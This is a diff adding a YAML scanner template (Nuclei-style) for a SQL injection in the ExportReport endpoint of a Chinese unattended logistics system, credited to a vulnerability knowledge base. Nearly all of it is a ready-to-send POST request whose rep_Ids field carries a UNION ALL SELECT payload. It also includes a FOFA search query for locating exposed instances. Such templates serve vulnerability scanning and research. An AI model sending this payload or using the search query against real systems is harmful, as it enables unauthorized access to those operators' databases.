@@ -1,0 +1,29 @@
+id: poc-gbxxq17laz16rxnn
+info:
+  name: 易思智能物流无人值守系统 ExportReport SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gbxxq17laz16rxnn'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gbxxq17laz16rxnn
+    fofa: body="/api/SingleLogin"
+http:
+- raw:
+  - 'POST /Sys_ReportFile/ExportReport HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Connection: close
+
+    rep_Ids=1%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2C@@VERSION%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+CdNX'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
